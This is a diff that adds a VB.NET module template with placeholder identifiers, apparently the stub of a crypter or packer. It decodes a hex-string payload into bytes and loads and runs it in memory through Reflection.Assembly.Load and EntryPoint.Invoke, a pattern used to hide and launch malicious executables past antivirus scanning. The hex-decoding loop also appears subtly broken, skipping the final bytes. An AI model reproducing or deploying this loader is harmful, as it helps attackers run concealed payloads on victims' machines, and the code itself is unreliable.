@@ -1,0 +1,28 @@
+Module %1%
+
+    Dim %2% As String
+    Dim %3% As Byte()
+	    Sub main()
+
+	 
+        %3% = %5%(%2%)
+
+
+        Dim %4% As Object = Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+				
+    End Sub
+
+    Function %5%(ByVal %8% As String) As Byte()
+        Dim %6%
+        Dim %7%() As Byte
+        %8% = Replace(%8%, " ", "")
+        ReDim %7%((Len(%8%) \ 2) - 1)
+        For %6% = 0 To UBound(%7%) - 2
+            %7%(%6%) = CLng("&H" & Mid$(%8%, 2 * %6% + 1, 2))
+        Next
+        %5% = %7%
+    End Function
+
+	
+End Module
